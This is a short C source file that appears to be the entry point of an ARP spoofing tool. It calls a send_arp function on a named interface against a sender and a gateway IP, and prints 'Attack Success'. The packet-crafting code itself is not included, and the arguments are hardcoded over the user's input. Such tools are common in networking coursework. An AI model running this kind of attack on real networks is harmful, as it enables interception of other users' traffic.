#include <pcap.h>
#include <stdio.h>

#include "send_arp.h"


void usage() {
  printf("send_arp <interface> <sender ip> <target ip>(gateway)\n");
  printf("send_arp wlan0 10.0.1.15 10.0.1.1\n");
}

int main(int argc, char *argv[])
{
    argc=4;
    argv[1]="eth0";
    argv[2]="10.0.1.15";
    argv[3]="10.0.1.1";

    if (argc != 4) {
        usage();
        return -1;
    }

    char *interface = argv[1];
    char *sender_ip = argv[2];
    char *target_ip = argv[3];

    if(send_arp(interface, sender_ip, target_ip) != 0)
        return -1;
    printf("Attack Success\n");
    return 0;

}



